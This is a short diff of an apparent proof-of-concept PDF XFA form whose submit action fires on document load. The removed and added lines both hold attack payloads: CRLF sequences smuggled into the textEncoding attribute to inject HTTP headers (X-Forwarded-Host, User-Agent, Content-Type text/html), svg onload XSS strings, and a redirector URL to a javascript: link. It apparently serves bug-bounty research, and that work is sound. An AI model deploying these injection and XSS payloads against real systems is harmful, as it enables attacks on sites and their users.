@@ -18,9 +18,9 @@ stream
         <field id="Hello World!">
             <event activity="docReady" ref="$host" name="event__click">
                <submit 
-                     textEncoding="UTF-8&#xD;&#xA;X-Forwarded-Host: &#x3C;svg/onload=alert(document.domain)&#x3E;&#xD;&#xA;User-Agent: &#x3C;svg/onload=alert(document.cookie)&#x3E;"
+                     textEncoding="UTF-8&#xD;&#xA;X-UA-Compatible: IE=5&#xD;&#xA;Content-Type: text/html;&#xD;&#xA;&#xD;&#xA;"
                      xdpContent="pdf datasets template"
-                     target="https://bughunt1307.herokuapp.com/redirector.php?x=https://www.google.com/earth/client/sharing/index_en.html#image=javascript:alert(0)"/>
+                     target="https://api.github.com/search/issues?q=alert(document.domain)&page,per_page,sort,order}"/>
             </event>
 </field>
     </subform>
